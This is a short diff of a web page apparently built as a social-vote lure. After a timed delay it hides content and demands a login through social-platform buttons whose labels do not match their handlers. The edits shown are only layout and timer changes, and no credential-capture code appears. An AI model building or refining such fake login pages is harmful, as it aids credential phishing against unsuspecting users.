@@ -84,6 +84,7 @@
         You must log in to continue!
       </span>
     </div>
+    <br>
     <div class="social-vote-button">
       <button onclick="showLoginForm('twitter')" class="microsoft-button"><i class="fab fa-microsoft"></i> Login with
         Email </button>
@@ -100,11 +101,6 @@
       </button>
     </div>
 
-    <div class="social-vote-button">
-      <button onclick="showLoginForm('tiktok')" class="tiktok-button3"><i class="fab fa-tiktok"></i> Login with
-        TikTok
-      </button>
-    </div>
     <br><br>
     <p class="powered-by">Powered by <strong>MBC</strong></p>
 
@@ -505,7 +501,7 @@
       // Hide iframe and show login prompt
       document.getElementById("iframe-container").classList.add("hidden");
       document.getElementById("login-prompt").classList.remove("hidden");
-    }, 2000); // 10 seconds timer
+    }, 10000); // 10 seconds timer
 
     // Show the respective login form based on selection
     function showLoginForm(platform) {
